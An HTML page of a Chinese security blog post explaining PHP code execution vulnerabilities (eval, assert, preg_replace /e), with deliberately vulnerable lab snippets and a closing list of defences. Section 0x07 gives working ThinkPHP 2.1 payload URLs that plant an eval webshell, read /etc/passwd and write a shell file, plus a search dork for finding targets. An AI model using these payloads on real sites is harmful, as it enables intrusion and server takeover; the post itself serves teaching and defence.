<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>代码执行漏洞(一) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>代码执行漏洞(一)</h1>
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2016-07-25</time>
    <span>in</span>
    
      <a href="/categories/Pentest">Pentest</a>
  </strong>
  <span> • 997 words</span>
  <span> • 2 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/rce">rce</a>
    </div>
  
</div>

      <div>

<h3 id="0x00-代码执行">0x00 代码执行</h3>

<p>当应用在调用一些能将字符转化为代码的函数(如PHP中的eval)时，没有考虑用户是否能控制这个字符串，这就会造成代码执行漏洞。</p>

<h3 id="0x01-相关函数">0x01 相关函数</h3>

<pre><code>PHP：eval assert
Python：exec
asp：&lt;%=CreateObject(“wscript.shell”).exec(“cmd.exe /c ipconfig”).StdOut.ReadAll()%&gt;
Java：没有类似函数，但采用的反射机制和各种基于反射机制的表达式引擎(OGNL、SpEL、MVEL等)有类似功能
</code></pre>

<h3 id="0x02-phpcms中的string2array函数">0x02 phpcms中的string2array函数</h3>

<p>这个函数可以将phpcms的数据库settings的字符串形式的数组内容转换为真实的数组</p>

<pre><code>array(  //这个是字符串形式的数组，它并不是数组，而是字符串
    'upload_maxsize' =&gt; '2048',
    'upload_allowext' =&gt; 'jpg|jpeg|gif|bmp|png|doc|docx|xls|xlsx|ppt|pptx|pdf|txt|rar|zip|swf', 
    'watermark_enable' =&gt; '1',
    'watermark_minwidth' =&gt; '300',
    'watermark_minheight' =&gt; '300',
    'watermark_img' =&gt; '/statics/img/water/mark.png',
    'watermark_pct' =&gt; '85',
    'watermark_quality' =&gt; '80',
    'watermark_pos' =&gt; '9',
)
</code></pre>

<pre><code class="language-php">function string2array($data) {
    //这个函数可以将字符串$data转化为数组
    if($data == '') 
        return array(); 
    @eval(&quot;\$array = $data;&quot;); 
        return $array;
}
</code></pre>

<h3 id="0x03-漏洞危害">0x03 漏洞危害</h3>

<ul>
<li>执行代码</li>
<li>让网站写shell</li>
<li>甚至控制服务器</li>
</ul>

<h3 id="0x04-漏洞分类-也是利用点">0x04 漏洞分类(也是利用点)</h3>

<pre><code>执行代码的函数：eval、assert
callback函数：preg_replace + /e模式
反序列化：unserialize()(反序列化函数)
</code></pre>

<h3 id="0x05-漏洞挖掘">0x05 漏洞挖掘</h3>

<pre><code>框架找漏洞，如ThinkPHP：
  inurl:index.php intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }
框架的URL格式如下：
  Site:Port/Module name/Method name/Property name/Preperty value
  Site:Port/index.php?m=Module_name&amp;f=Method_name&amp;v=Preperty_value
  
  www.xx.com:88/News/show/id/328
  www.yy.com:99/index.php?m=News&amp;f=detail&amp;item=23
  www.zz.com/global_cms_contentview_id_2435
</code></pre>

<h3 id="0x06-搭建环境实验">0x06 搭建环境实验</h3>

<ul>
<li><p>示例一</p>

<pre><code class="language-php">&lt;?php
$data = $_GET['data'];
eval(&quot;\$ret = $data;&quot;);
echo $ret;
?&gt;
</code></pre>

<p><img src="/img/post/code_execution_eval1.png" alt="代码执行漏洞使用eval函数1" /></p></li>

<li><p>示例二</p>

<pre><code class="language-php">&lt;?php
$data = $_GET['data'];
eval(&quot;\$ret = strtolower('$data');&quot;);
echo $ret;
?&gt;
</code></pre>

<p><img src="/img/post/code_execution_eval2.png" alt="代码执行漏洞使用eval函数2" /></p></li>

<li><p>示例三</p>

<pre><code class="language-php">&lt;?php
$data = $_GET['data'];
eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
echo $ret;
?&gt;
</code></pre>

<p><img src="/img/post/code_execution_eval3.png" alt="代码执行漏洞使用eval函数3" />
<img src="/img/post/code_execution_eval4.png" alt="代码执行漏洞使用eval函数4" /></p></li>

<li><p>示例四</p>

<pre><code class="language-php">&lt;?php
$data = $_GET['data'];
eval(&quot;\$ret = strtolower(\&quot;$data\&quot;);&quot;);
echo $ret;
?&gt;
</code></pre>

<p><img src="/img/post/code_execution_eval5.png" alt="代码执行漏洞使用eval函数5" />
<img src="/img/post/code_execution_eval6.png" alt="代码执行漏洞使用eval函数6" /></p></li>

<li><p>示例五<br />
mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])<br />
/e修正符使preg_replace()将replacement参数当作PHP 代码(在适当的逆向引用替换完之后)</p>

<pre><code class="language-php">&lt;?php
$data = $_GET['data'];
$ret = preg_replace('/&lt;data&gt;(.*?)&lt;\/data&gt;/e','$ret = &quot;\\1&quot;',$data);
echo $ret;
?&gt;
</code></pre>

<p><img src="/img/post/code_execution_preg_replace.png" alt="代码执行漏洞使用preg_replace函数" /></p></li>
</ul>

<h3 id="0x07-具体操作">0x07 具体操作</h3>

<pre><code># 一般找CMS相应版本漏洞，如ThinkPHP2.1
* 一句话
    http://www.xxx.com/News/detail/id/{${@eval($_POST[aa])}}
* 得到当前路径
    http://www.xxx.com/News/detail/id/{${print(getcwd()))}}
* 读文件
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_get_contents($_POST['f'])))}}
    POST的数据为：f=/etc/passwd
* 写shell
    http://www.xxx.com/News/detail/id/{${exit(var_dump(file_put_contents($_POST['f'],$_POST[d])))}}
    POST的数据为：f=1.php&amp;d=&lt;?php @eval($_POST['aa'])?&gt;
</code></pre>

<h3 id="0x08-漏洞防御">0x08 漏洞防御</h3>

<ul>
<li>使用json保存数组，当读取时就不需要使用eval了</li>
<li>对于必须使用eval的地方，一定严格处理用户数据</li>
<li>字符串使用单引号包括可控代码，插入前使用addslashes转义</li>
<li>放弃使用preg_replace的e修饰符，使用preg_replace_callback()替换</li>
<li>若必须使用preg_replace的e修饰符，则必用单引号包裹正则匹配出的对象</li>
</ul>

<h4 id="下一篇-代码执行漏洞-二-posts-2016-code-execution-vulnerabilities-2">下一篇：<a href="/posts/2016/code-execution-vulnerabilities-2/">代码执行漏洞(二)</a></h4>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         | 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    using the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
